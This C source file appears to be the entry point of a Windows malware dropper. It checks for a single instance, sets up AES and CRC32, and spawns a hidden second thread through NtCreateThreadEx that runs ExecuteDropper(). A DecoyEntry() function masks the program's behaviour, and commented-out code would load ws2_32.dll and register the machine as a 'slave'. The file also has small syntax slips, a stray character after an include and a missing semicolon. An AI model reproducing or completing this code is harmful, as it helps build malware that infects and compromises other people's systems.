#include <config.h>
#include <ldr.h>
#include <ntapi.h>
#include <instance.h>
#include <register.h>
#include <dropper.h>s
#include <crc32.h>
#include <aes.h>

static
ULONG
WINAPI
InitialEntrySplitted(VOID)
{
    #ifdef DEBUG
        UNICODE_STRING DebugName = CONST_UNICODE_STRING(SCFG_DLOG_CORE_THREAD1);

        $DLogInitialize(&DebugName, TRUE);
    #endif

    InitAes();

    //ULONG_PTR dwTries = 0;
    //QWORD qwTimeout = -MS_TO_100NS(200);

    //for (dwTries = 0; dwTries != 5; dwTries++) {
    //    if (LdrLoadWsapi()) {
    //        break;
    //    }

    //    if (NT_ERROR(NtDelayExecution(FALSE, (PVOID)&qwTimeout))) {
    //        $DLOG1(DLG_FLT_CRITICAL, "NtDelayExecution failed!");

    //        return 0;
    //    }
    //}

    //if (dwTries == 4) {
    //    $DLOG1(DLG_FLT_CRITICAL, "Failed to find ws2_32.dll");

    //    return 0;
    //}

    //if (!RegisterSlave()) {
    //    return 0;
    //}

    ExecuteDropper();

    return 0;
}

extern
ULONG
WINAPI
DecoyEntry(VOID);

ULONG
WINAPI
InitialEntry(VOID)
{
    #ifdef DEBUG
        UNICODE_STRING DebugName = CONST_UNICODE_STRING(SCFG_DLOG_CORE_THREAD0);

        $DLogInitialize(&DebugName, TRUE);
    #endif

    if (!InitConfig()) {
        return 0;
    }

    if(!LdrLoadNtapi()) {
        return 0;
    }

    InitCrc32();

#if SCFG_IGNORE_ISTANCE == ON
    CreateInstance()

    if (TRUE) {
#else
    if (CreateInstance()) {
#endif
        HANDLE hThread;

        if (!NT_ERROR(NtCreateThreadEx(&hThread, STANDARD_RIGHTS_ALL | SPECIFIC_RIGHTS_ALL, NULL, NtCurrentProcess(), InitialEntrySplitted, (PVOID)RTLP_LCG_NATIVE, 0, 0, PAGE_SIZE, PAGE_SIZE, NULL))) {
            $DLOG1(DLG_FLT_DEFAULT, "Second stage of InitialEntrySplitted started");
        } else {
            $DLOG1(DLG_FLT_ERROR, "Failed to continue entry on different thread");
        }
    }

    return DecoyEntry();
}
